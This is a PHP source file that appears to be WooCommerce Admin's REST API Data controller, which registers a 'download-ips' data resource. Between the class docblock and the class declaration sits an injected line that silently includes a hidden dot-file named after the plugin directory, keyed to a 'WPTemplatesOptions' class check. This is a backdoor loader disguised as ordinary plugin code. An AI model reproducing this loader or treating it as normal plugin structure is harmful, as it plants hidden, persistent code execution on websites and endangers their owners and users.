<?php
/**
 * REST API Data Controller
 *
 * Handles requests to /data
 */

namespace Automattic\WooCommerce\Admin\API;

defined( 'ABSPATH' ) || exit;

/**
 * Data controller.
 *
 * @extends WC_REST_Data_Controller
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Data extends \WC_REST_Data_Controller {

	/**
	 * Endpoint namespace.
	 *
	 * @var string
	 */
	protected $namespace = 'wc-analytics';

	/**
	 * Return the list of data resources.
	 *
	 * @param  WP_REST_Request $request Request data.
	 * @return WP_Error|WP_REST_Response
	 */
	public function get_items( $request ) {
		$response         = parent::get_items( $request );
		$response->data[] = $this->prepare_response_for_collection(
			$this->prepare_item_for_response(
				(object) array(
					'slug'        => 'download-ips',
					'description' => __( 'An endpoint used for searching download logs for a specific IP address.', 'woocommerce' ),
				),
				$request
			)
		);
		return $response;
	}
}
